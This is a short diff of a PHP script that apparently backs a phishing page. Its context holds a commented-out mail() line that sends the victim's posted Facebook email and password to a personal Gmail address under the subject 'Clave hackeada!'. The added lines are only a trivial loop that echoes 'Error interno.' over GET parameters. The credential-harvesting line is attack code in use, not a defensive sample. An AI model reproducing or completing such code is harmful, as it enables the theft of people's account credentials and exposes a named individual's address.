@@ -4,6 +4,11 @@
 
     //mail("lcondori@gmail.com","Clave hackeada!","Estas son las credenciales de Facebook<br> email: ".$_POST["email"]."<br> Pass: ".$_POST["pass"]);
 
+    foreach ($_GET as $clave=>$valor){
+        if( !isset($clave) ){
+            echo 'Error interno.';
+        }
+    }
 
 $destinatario = "lcondori@gmail.com"; 
 $asunto = "Un nuevo mensaje desde la web!"; 
